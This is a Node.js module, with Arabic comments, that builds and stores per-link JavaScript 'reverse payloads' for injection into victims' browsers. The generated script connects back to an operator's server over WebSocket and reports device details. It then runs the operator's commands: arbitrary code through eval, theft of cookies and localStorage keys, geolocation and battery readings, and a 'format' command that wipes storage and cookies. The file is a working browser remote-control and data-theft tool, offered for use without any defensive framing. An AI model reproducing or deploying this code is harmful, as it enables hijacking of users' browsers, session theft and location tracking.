const { v4: uuidv4 } = require('uuid');

class AdvancedPayloadSystem {
    constructor() {
        this.payloads = new Map();
        this.sessions = new Map();
    }

    createAdvancedLinkPayload(linkId, serverUrl) {
        const payloadId = uuidv4();
        
        const advancedPayload = `
// === ADVANCED REVERSE PAYLOAD ===
(function() {
    const CONFIG = {
        link_id: '${linkId}',
        payload_id: '${payloadId}',
        server_url: '${serverUrl}',
        version: '1.0.0'
    };

    console.log('🦠 Reverse Payload Activated');

    // بدء النظام
    function startSystem() {
        connectToServer();
        startMonitoring();
    }

    // الاتصال بالسيرفر
    function connectToServer() {
        try {
            const ws = new WebSocket(CONFIG.server_url.replace('https', 'wss'));
            
            ws.onopen = function() {
                sendDeviceInfo(ws);
            };
            
            ws.onmessage = function(event) {
                handleCommand(event);
            };
            
            ws.onclose = function() {
                setTimeout(connectToServer, 3000);
            };
            
            ws.onerror = function() {
                setTimeout(connectToServer, 5000);
            };
            
        } catch (error) {
            setTimeout(connectToServer, 5000);
        }
    }

    // إرسال معلومات الجهاز
    function sendDeviceInfo(ws) {
        const deviceInfo = {
            device_id: generateDeviceId(),
            userAgent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: {
                width: window.screen?.width,
                height: window.screen?.height
            },
            url: window.location.href,
            timestamp: new Date().toISOString()
        };
        
        ws.send(JSON.stringify({
            type: 'reverse_connect',
            device_id: deviceInfo.device_id,
            link_id: CONFIG.link_id,
            payload_id: CONFIG.payload_id,
            platform: deviceInfo.platform,
            userAgent: deviceInfo.userAgent,
            url: deviceInfo.url,
            device_info: deviceInfo
        }));
    }

    // معالجة الأوامر
    function handleCommand(event) {
        try {
            const data = JSON.parse(event.data);
            
            if (data.type === 'command') {
                executeCommand(data.command, data.device_id)
                    .then(result => {
                        event.target.send(JSON.stringify({
                            type: 'command_result',
                            device_id: data.device_id,
                            command: data.command,
                            result: result
                        }));
                    });
            }
        } catch (e) {}
    }

    // نظام المراقبة
    function startMonitoring() {
        // مراقبة الموقع
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(position => {
                // يمكن إرسال الموقع لو احتجنا
            });
        }
    }

    // تنفيذ الأوامر
    async function executeCommand(command, deviceId) {
        try {
            let result = '';
            const cmd = command.toLowerCase().trim();
            
            if (cmd === 'معلومات') {
                result = await getSystemInfo();
            }
            else if (cmd === 'الموقع') {
                result = await getLocation();
            }
            else if (cmd === 'اهتزاز') {
                result = triggerVibration();
            }
            else if (cmd === 'البطارية') {
                result = await getBattery();
            }
            else if (cmd === 'الصور') {
                result = getImages();
            }
            else if (cmd === 'التخزين') {
                result = getStorage();
            }
            else if (cmd === 'لقطة') {
                result = takeScreenshot();
            }
            else if (cmd === 'فرمتة') {
                result = formatDevice();
            }
            else if (cmd.startsWith('js:')) {
                const jsCode = command.substring(3);
                result = String(await eval(jsCode));
            } else {
                result = String(await eval(command));
            }
            
            return result || '✅ تم التنفيذ';
            
        } catch (error) {
            return '❌ خطأ: ' + error.toString();
        }
    }

    // معلومات النظام
    async function getSystemInfo() {
        const info = {
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen: window.screen ? \`\${window.screen.width}x\${window.screen.height}\` : 'Unknown',
            cookies: document.cookie,
            url: window.location.href,
            timestamp: new Date().toISOString()
        };
        
        return JSON.stringify(info, null, 2);
    }

    // الموقع
    function getLocation() {
        return new Promise((resolve) => {
            if (!navigator.geolocation) {
                resolve('❌ لا يدعم الموقع');
                return;
            }
            
            navigator.geolocation.getCurrentPosition(
                position => {
                    resolve(JSON.stringify({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy + ' متر'
                    }, null, 2));
                },
                error => {
                    resolve('❌ خطأ في الموقع');
                }
            );
        });
    }

    // الاهتزاز
    function triggerVibration() {
        if (navigator.vibrate) {
            navigator.vibrate([200, 100, 200]);
            return '📳 تم تشغيل الاهتزاز';
        }
        return '❌ لا يدعم الاهتزاز';
    }

    // البطارية
    function getBattery() {
        return new Promise((resolve) => {
            if (navigator.getBattery) {
                navigator.getBattery().then(battery => {
                    resolve(JSON.stringify({
                        level: (battery.level * 100) + '%',
                        charging: battery.charging ? 'نعم' : 'لا'
                    }, null, 2));
                });
            } else {
                resolve('❌ لا يدعم البطارية');
            }
        });
    }

    // الصور
    function getImages() {
        try {
            const images = Array.from(document.images);
            return \`🖼️ العدد: \${images.length}\nالمصادر: \${images.map(img => img.src).join(', ')}\`;
        } catch (error) {
            return '❌ خطأ في الصور';
        }
    }

    // التخزين
    function getStorage() {
        try {
            return JSON.stringify({
                cookies: document.cookie,
                localStorage: localStorage ? Object.keys(localStorage) : []
            }, null, 2);
        } catch (error) {
            return '❌ خطأ في التخزين';
        }
    }

    // لقطة الشاشة
    function takeScreenshot() {
        return '📸 هذه الميزة تحتاج مكتبة html2canvas';
    }

    // الفرمتة
    function formatDevice() {
        try {
            if (localStorage) localStorage.clear();
            document.cookie.split(";").forEach(cookie => {
                const name = cookie.split("=")[0].trim();
                document.cookie = name + "=; expires=Thu, 01 Jan 1970 00:00:00 UTC; path=/;";
            });
            return '✅ تم محاكاة الفرمتة';
        } catch (error) {
            return '❌ خطأ في الفرمتة';
        }
    }

    // إنشاء معرف الجهاز
    function generateDeviceId() {
        return 'device_' + Math.random().toString(36).substr(2, 9);
    }

    // بدء النظام
    console.log('🚀 Starting Reverse Payload...');
    setTimeout(startSystem, 1000);

})();
`;

        this.payloads.set(payloadId, {
            linkId: linkId,
            payload: advancedPayload,
            createdAt: new Date()
        });

        return {
            payloadId: payloadId,
            code: advancedPayload
        };
    }

    getPayload(payloadId) {
        return this.payloads.get(payloadId);
    }

    registerSession(deviceId, sessionData) {
        this.sessions.set(deviceId, {
            ...sessionData,
            lastActive: new Date(),
            active: true
        });
    }
}

module.exports = AdvancedPayloadSystem;
